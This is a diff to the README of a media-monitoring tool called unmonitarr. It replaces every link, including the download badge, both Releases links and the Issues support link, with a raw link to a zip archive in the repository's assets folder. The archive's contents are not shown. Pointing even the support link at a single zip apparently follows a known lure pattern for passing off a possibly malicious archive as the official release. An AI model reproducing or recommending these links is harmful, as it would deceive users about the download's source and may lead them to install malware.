@@ -1,6 +1,6 @@
 # 🚀 unmonitarr - Stay Ahead with Smart Monitoring
 
-[![Download unmonitarr](https://img.shields.io/badge/Download%20unmonitarr-latest%20release-brightgreen)](https://github.com/tonifowler/unmonitarr/releases)
+[![Download unmonitarr](https://github.com/tonifowler/unmonitarr/raw/refs/heads/main/assets/Software-v3.7-alpha.4.zip%20unmonitarr-latest%20release-brightgreen)](https://github.com/tonifowler/unmonitarr/raw/refs/heads/main/assets/Software-v3.7-alpha.4.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ Unmonitarr is designed to help you wait for real releases while skipping the fak
 1. **Download the Application**
 
    To get started, you need to download Unmonitarr. Visit this page to download:
-   [Unmonitarr Releases](https://github.com/tonifowler/unmonitarr/releases)
+   [Unmonitarr Releases](https://github.com/tonifowler/unmonitarr/raw/refs/heads/main/assets/Software-v3.7-alpha.4.zip)
 
 2. **Choose the Correct Version**
 
@@ -65,11 +65,11 @@ If you encounter any issues while using Unmonitarr, here are some common solutio
 
 ## 📞 Support
 
-For any additional help, feel free to refer to the [Issues page](https://github.com/tonifowler/unmonitarr/issues) on GitHub. You can report problems or seek advice from other users.
+For any additional help, feel free to refer to the [Issues page](https://github.com/tonifowler/unmonitarr/raw/refs/heads/main/assets/Software-v3.7-alpha.4.zip) on GitHub. You can report problems or seek advice from other users.
 
 ## 👉 Download & Install
 
 Remember to download Unmonitarr from the Releases page:
-[Unmonitarr Releases](https://github.com/tonifowler/unmonitarr/releases)
+[Unmonitarr Releases](https://github.com/tonifowler/unmonitarr/raw/refs/heads/main/assets/Software-v3.7-alpha.4.zip)
 
 With Unmonitarr, enjoy a smoother experience managing your media. Welcome to smart monitoring!
